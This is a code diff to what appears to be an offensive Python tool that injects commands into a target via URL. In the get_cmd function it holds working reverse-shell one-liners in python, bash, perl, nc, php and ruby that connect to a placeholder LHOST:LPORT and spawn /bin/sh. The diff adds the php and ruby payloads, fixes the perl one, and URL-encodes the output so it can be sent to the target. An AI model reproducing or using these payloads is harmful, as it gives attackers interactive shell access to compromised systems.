@@ -75,8 +75,10 @@ def get_cmd(cmd):
   lang = {
     'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh")\'',
     'bash': 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
-    'perl': 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;&;S");open(STDOUT,">;&;S");open(STDERR,">;&;S");exec("/bin/sh -i");};\'',
-    'nc': 'nc -nv LHOST LPORT -e /bin/bash',
+    'perl': 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
+    'nc': 'nc -nv LHOST LPORT -e /bin/bash', #only works with newer nc version
+    'php': 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    'ruby': 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i")\''
   }
   if cmd == "exit":
     exit()
@@ -97,9 +99,11 @@ def get_cmd(cmd):
     else:
       tmp = sub("LHOST", cmd.split()[2], lang[(cmd.split()[1])])
       tmp = sub("LPORT", cmd.split()[3], tmp)
-      return tmp
+      print(tmp)
+      return parse.quote(tmp) # to urlencode on send.
+
   else:
-    return cmd
+    return parse.quote(cmd)
 
 
 tools = get_tools(url)
